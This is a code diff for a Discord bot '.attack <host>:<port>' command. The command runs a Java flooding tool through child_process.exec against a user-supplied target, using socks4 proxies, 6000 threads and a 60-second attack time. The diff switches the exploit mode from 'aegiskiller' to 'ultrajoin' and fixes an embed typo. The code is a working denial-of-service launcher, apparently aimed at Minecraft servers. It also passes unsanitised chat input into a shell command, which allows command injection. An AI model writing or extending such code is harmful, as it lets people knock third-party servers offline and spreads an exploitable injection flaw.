@@ -1,4 +1,5 @@
 const Discord = require("discord.js");
+const { MessageEmbed } = require("discord.js");
 
 exports.run = async (client, message, args) => {
 
@@ -7,7 +8,6 @@ exports.run = async (client, message, args) => {
 const host = args.join(" ").split(":").slice(0,1)
 const port = message.content.split (":")[1]
     const proxy = args.join(" ").slice(2)
-const { MessageEmbed } = require("discord.js");
 
 if(!port)
 return message.channel.send("〔💥〕Usage: .attack <host>:<port>")
@@ -19,11 +19,11 @@ var exec = require('child_process').exec
 
 
 
-exec('java -jar CIPHER-BOT.jar host=' + host + ' port=' + port +  ' protocol=47 exploit=aegiskiller proxiesFile=socks4.txt srvResolve=false srvResolve2=false threads=6000 timeout=500 attackTime=60 connections=6000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true', (error, stdout, stderr) => {
+exec('java -jar CIPHER-BOT.jar host=' + host + ' port=' + port +  ' protocol=47 exploit=ultrajoin proxiesFile=socks4.txt srvResolve=false srvResolve2=false threads=6000 timeout=500 attackTime=60 connections=6000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true', (error, stdout, stderr) => {
 });
-    const embed = new Discord.MessageEmbed()
+    const embed = new MessageEmbed()
       .setColor('RANDOM')
-      .etTitle('Custompayload > REQUEST ACCEPTED')
+      .setTitle('Custompayload > REQUEST ACCEPTED')
       .setDescription('Starting attack...')
       .addField('Hostname (IP)', host)  
       .addField('Port (...)', port)     
